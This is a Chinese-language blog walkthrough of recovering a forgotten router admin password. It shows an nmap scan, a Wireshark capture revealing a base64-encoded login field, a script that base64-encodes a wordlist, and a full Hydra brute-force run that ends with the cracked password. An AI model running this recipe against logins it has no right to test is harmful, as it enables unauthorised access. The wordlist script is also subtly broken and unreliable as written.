---
layout: post
title:  "暴力破解一则"
categories: Linux
tags:  hydra crunch  kail
author: Utachi
---

* content
{:toc}

# 发现对象
某环境中，管理员离职太久已经找不到网关的管理方式(人也换电话了，手动笑哭)，我过去帮忙，连上AP后发现自己的电脑DHCP获取了IP地址，且能发现网关是192.168.0.252

# 嗅探
```bash
root@kali:/tmp#  nmap -sV 192.168.0.252

Starting Nmap 7.70 ( https://nmap.org ) at 2019-12-17 14:54 CST
Nmap scan report for 192.168.0.252
Host is up (0.0021s latency).
Not shown: 997 closed ports
PORT      STATE SERVICE     VERSION
80/tcp    open  http        GoAhead WebServer
    #好像有个页面
9000/tcp  open  cslistener?
10004/tcp open  emcrmirccd?
MAC Address: D8:38:BD:29:34:00 (Shenzhen Ip-com Network)
    #深圳的IP-com设备
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 159.83 seconds

```






登录IP地址以后会跳转到http://192.168.0.252/login.asp，只需要填密码

# 简单测试

填入随机密码123456后跳转到http://192.168.0.252/login.asp#pwdError
看来还需要看下提交的表单参数

# 抓包

模拟登陆，给wireshark过滤规则：http.request.method==POST

```bash
Hypertext Transfer Protocol
    POST /login/Auth HTTP/1.1\r\n
    Host: 192.168.0.252\r\n
    Connection: keep-alive\r\n
    Content-Length: 32\r\n
    Cache-Control: max-age=0\r\n
    Origin: http://192.168.0.252\r\n
    Upgrade-Insecure-Requests: 1\r\n
    Content-Type: application/x-www-form-urlencoded\r\n
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36\r\n
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n
    Referer: http://192.168.0.252/login.asp\r\n
    Accept-Encoding: gzip, deflate\r\n
    Accept-Language: zh-CN,zh;q=0.9\r\n
    \r\n
    [Full request URI: http://192.168.0.252/login/Auth]
    [HTTP request 4/4]
    [Prev request in frame: 706]
    [Response in frame: 978]
    File Data: 32 bytes

HTML Form URL Encoded: application/x-www-form-urlencoded
    Form item: "username" = "admin"
        Key: username
        Value: admin
    Form item: "password" = "MTIzNDU2"
        #这里的这个密码串好像在哪见过，百度一下居然是123456的base64加密串
        Key: password
        Value: MTIzNDU2
```

# 构造URL

根据抓包的FULL-URL构造如下：
http://192.168.0.252/login/Auth:username=admin&password=`[password]`
且判断返回的错误关键字是`pwdError`

# 选择密码字典

```bash
root@kali:/tmp# cp /usr/share/wordlists/fern-wifi/common.txt  ./password.txt
#user字段默认是admin，则只写一个文件就好
root@kali:/tmp# echo "admin" > /tmp/user.txt

cat > tans.sh << EOF 
While_read_LINE(){
FILENAME=/tmp/password.txt
cat $FILENAME | while read LINE
do
echo $LINE | base64 >> password-base64.txt
done
}
While_read_LINE
EOF

#执行上面的脚本将字典转换成base64字串
root@kali:/tmp# sh tans.sh

```

# 执行attack
```bash
root@kali:/tmp# hydra -L /tmp/user.txt -P /tmp/password-base64.txt  -vV -f 192.168.0.252 http-post-form "/login/Auth:username=^USER^&password=^PASS^:pwdError"
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-12-17 15:44:14
[DATA] max 16 tasks per 1 server, overall 16 tasks, 223 login tries (l:1/p:223), ~14 tries per task
[DATA] attacking http-post-form://192.168.0.252:80/login/Auth:username=^USER^&password=^PASS^:Msg
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 192.168.0.252 - login "admin" - pass "" - 1 of 223 [child 0] (0/0)
[ATTEMPT] target 192.168.0.252 - login "admin" - pass "U3ByaW5nMjAxNwo=" - 2 of 223 [child 1] (0/0)
[ATTEMPT] target 192.168.0.252 - login "admin" - pass "U3ByaW5nMjAxNgo=" - 3 of 223 [child 2] (0/0)
[ATTEMPT] target 192.168.0.252 - login "admin" - pass "U3ByaW5nMjAxNQo=" - 4 of 223 [child 3] (0/0)
[ATTEMPT] target 192.168.0.252 - login "admin" - pass "U3ByaW5nMjAxNAo=" - 5 of 223 [child 4] (0/0)
[ATTEMPT] target 192.168.0.252 - login "admin" - pass "U3ByaW5nMjAxMwo=" - 6 of 223 [child 5] (0/0)
[ATTEMPT] target 192.168.0.252 - login "admin" - pass "c3ByaW5nMjAxNwo=" - 7 of 223 [child 6] (0/0)
[ATTEMPT] target 192.168.0.252 - login "admin" - pass "c3ByaW5nMjAxNgo=" - 8 of 223 [child 7] (0/0)
[ATTEMPT] target 192.168.0.252 - login "admin" - pass "c3ByaW5nMjAxNQo=" - 9 of 223 [child 8] (0/0)
[ATTEMPT] target 192.168.0.252 - login "admin" - pass "c3ByaW5nMjAxNAo=" - 10 of 223 [child 9] (0/0)
[ATTEMPT] target 192.168.0.252 - login "admin" - pass "c3ByaW5nMjAxMwo=" - 11 of 223 [child 10] (0/0)
[ATTEMPT] target 192.168.0.252 - login "admin" - pass "U3VtbWVyMjAxNwo=" - 12 of 223 [child 11] (0/0)
[ATTEMPT] target 192.168.0.252 - login "admin" - pass "U3VtbWVyMjAxNgo=" - 13 of 223 [child 12] (0/0)
[ATTEMPT] target 192.168.0.252 - login "admin" - pass "U3VtbWVyMjAxNQo=" - 14 of 223 [child 13] (0/0)
[ATTEMPT] target 192.168.0.252 - login "admin" - pass "U3VtbWVyMjAxNAo=" - 15 of 223 [child 14] (0/0)
[ATTEMPT] target 192.168.0.252 - login "admin" - pass "U3VtbWVyMjAxMwo=" - 16 of 223 [child 15] (0/0)
·
·
·
#此处省略一万个字
[VERBOSE] Page redirected to http://192.168.0.252/login.asp#pwdError
[VERBOSE] Page redirected to http://192.168.0.252/login.asp#pwdError
[VERBOSE] Page redirected to http://192.168.0.252/login.asp#pwdError
[VERBOSE] Page redirected to http://192.168.0.252/login.asp#pwdError
[VERBOSE] Page redirected to http://192.168.0.252/login.asp#pwdError
[VERBOSE] Page redirected to http://192.168.0.252/login.asp#pwdError
[VERBOSE] Page redirected to http://192.168.0.252/login.asp#pwdError
[VERBOSE] Page redirected to http://192.168.0.252/login.asp#pwdError
[VERBOSE] Page redirected to http://192.168.0.252/login.asp#pwdError
[VERBOSE] Page redirected to http://192.168.0.252/login.asp#pwdError
[VERBOSE] Page redirected to http://192.168.0.252/login.asp#pwdError
[VERBOSE] Page redirected to http://192.168.0.252/login.asp#pwdError
[VERBOSE] Page redirected to http://192.168.0.252/login.asp#pwdError
[VERBOSE] Page redirected to http://192.168.0.252/login.asp#pwdError
[VERBOSE] Page redirected to http://192.168.0.252/login.asp#pwdError
[VERBOSE] Page redirected to http://192.168.0.252/login.asp#pwdError
[80][http-post-form] host: 192.168.0.252   login: admin   password: QWRtaW5fbHhAMjAxNw==
[STATUS] attack finished for 192.168.0.252 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-12-17 15:54:15


#解密base64字串
root@kali:/tmp# echo "QWRtaW5fbHhAMjAxNw=="|base64 -d
Admin_lx@2017

```
# 舒服了